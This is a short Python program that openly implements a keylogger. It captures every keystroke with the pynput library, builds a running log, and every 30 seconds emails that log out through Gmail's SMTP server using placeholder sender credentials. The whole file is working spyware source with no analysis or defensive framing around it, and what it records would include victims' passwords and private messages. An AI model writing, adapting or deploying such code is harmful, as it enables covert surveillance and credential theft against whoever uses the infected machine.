import smtplib
import pynput.keyboard
import threading

# Stores the keystrokes captured by the keylogger
keystroke_log = ""

# This function is called every time a key is pressed
def on_key_press(key):
    global keystroke_log
    try:
        keystroke_log += str(key.char)
    except AttributeError:
        if key == key.space:
            keystroke_log += " "
        else:
            keystroke_log += str(key)
    except:
        pass
    print(keystroke_log)

# Sends the keystroke log to the specified email address
def send_email(sender_email, sender_password, message):
    try:
        email_server = smtplib.SMTP("smtp.gmail.com", 587)
        email_server.starttls()
        email_server.login(sender_email, sender_password)
        email_server.sendmail(sender_email, sender_email, message)
        email_server.quit()
    except:
        print("Email could not be sent")

# This function runs periodically to send the log and reset it
def report_keystrokes():
    global keystroke_log
    send_email("user@gmail.com", "password", keystroke_log.encode('utf-8'))
    keystroke_log = ""
    # Set up the timer to call this function again after 30 seconds
    timer = threading.Timer(30, report_keystrokes)
    timer.start()

def main():
    global keystroke_log
    keystroke_log = ""

    # Set up the keylogger listener
    keylogger_listener = pynput.keyboard.Listener(on_press=on_key_press)
    with keylogger_listener:
        # Start the periodic reporting function
        report_keystrokes()
        # Keep the listener running
        keylogger_listener.join()

main()